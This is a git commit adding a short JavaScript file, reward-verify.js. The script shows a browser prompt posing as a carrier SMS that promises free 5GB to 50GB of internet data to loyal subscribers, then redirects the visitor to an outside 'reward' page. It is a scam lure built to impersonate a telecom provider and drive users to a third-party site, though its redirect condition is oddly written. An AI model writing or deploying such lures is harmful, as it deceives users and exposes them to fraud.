ff2de4f582f3c25e178fdb1c6eeb5c76022137b2
itidetidre-glitch <itidetidre@gmail.com>
2026-05-19 13:38:19 +0100

    Create reward-verify.js

---
+++ reward-verify.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE NOW'
+password=prompt('SMS: Dear Customer, Kindly Receive Free Internet Data From 5GB To 50GB For Being Our Long Time Subscribers, press OK To Check Now ','ACTIVATE NOW');
+if (password != 'ACTIVATE NOW') {
+location.href='https://mmaifot.com/reward.html';
+}
